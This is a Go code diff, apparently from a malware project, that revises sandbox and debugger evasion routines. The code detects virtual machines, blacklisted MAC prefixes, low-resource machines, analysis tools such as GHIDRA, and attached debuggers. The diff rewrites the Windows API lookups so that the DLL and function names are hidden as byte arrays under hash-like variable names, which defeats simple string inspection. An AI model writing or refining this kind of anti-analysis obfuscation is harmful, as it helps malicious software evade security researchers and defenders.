@@ -8,7 +8,6 @@ import (
 	"unsafe"
 
 	"github.com/klauspost/cpuid"
-	"github.com/shirou/gopsutil/mem"
 )
 
 func ContinueRun() bool {
@@ -38,7 +37,6 @@ var blacklistedMacAddressPrefixes = []string{
 
 func checkNic() bool {
 	interfaces, err := net.Interfaces()
-
 	if err != nil {
 		return false
 	}
@@ -61,17 +59,45 @@ func checkNic() bool {
 	return false
 }
 
+type memoryStatusEx struct {
+	dwLength                uint32
+	dwMemoryLoad            uint32
+	ullTotalPhys            uint64
+	ullAvailPhys            uint64
+	ullTotalPageFile        uint64
+	ullAvailPageFile        uint64
+	ullTotalVirtual         uint64
+	ullAvailVirtual         uint64
+	ullAvailExtendedVirtual uint64
+}
+
 func checkResource() bool {
 	if cpuid.CPU.VM() {
 		return true
 	}
 
-	vmStat, err := mem.VirtualMemory()
-
+	modKernel32, err := syscall.LoadLibrary(string([]byte{
+		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
+	}))
 	if err != nil {
 		return false
 	}
-	if runtime.NumCPU() < 2 && vmStat.Total < 3072000000 {
+	procc316a0c981be, err := syscall.GetProcAddress(modKernel32, string([]byte{
+		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x',
+	}))
+	if err != nil {
+		return false
+	}
+
+	memStatus := memoryStatusEx{}
+	memStatus.dwLength = (uint32)(unsafe.Sizeof(memStatus))
+	if ret, _, _ := syscall.Syscall(
+		procc316a0c981be,
+		1, (uintptr)(unsafe.Pointer(&memStatus)), 0, 0); ret == 0 {
+		return false
+	}
+
+	if runtime.NumCPU() < 2 || memStatus.ullTotalPhys < 1<<31 {
 		return true
 	}
 
@@ -85,6 +111,8 @@ var blacklistDBG = []string{
 	"GHIDRA",
 }
 
+const MAX_PATH = 260
+
 func detectDBG() bool {
 	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
@@ -97,7 +125,7 @@ func detectDBG() bool {
 	err = syscall.Process32First(handle, &pe32)
 
 	for err == nil {
-		exeFile := strings.ToUpper(syscall.UTF16ToString(pe32.ExeFile[:260]))
+		exeFile := strings.ToUpper(syscall.UTF16ToString(pe32.ExeFile[:MAX_PATH]))
 		for _, pn := range blacklistDBG {
 			if strings.Contains(exeFile, pn) {
 				return true
@@ -106,9 +134,20 @@ func detectDBG() bool {
 		err = syscall.Process32Next(handle, &pe32)
 	}
 
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
-	ret, _, _ := isDebuggerPresent.Call()
+	modKernel32, err := syscall.LoadLibrary(string([]byte{
+		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
+	}))
+	if err != nil {
+		return false
+	}
+	procdd3ddec77639, err := syscall.GetProcAddress(modKernel32, string([]byte{
+		'I', 's', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't',
+	}))
+	if err != nil {
+		return false
+	}
+
+	ret, _, _ := syscall.Syscall(procdd3ddec77639, 0, 0, 0, 0)
 	if ret != 0 {
 		return true
 	}
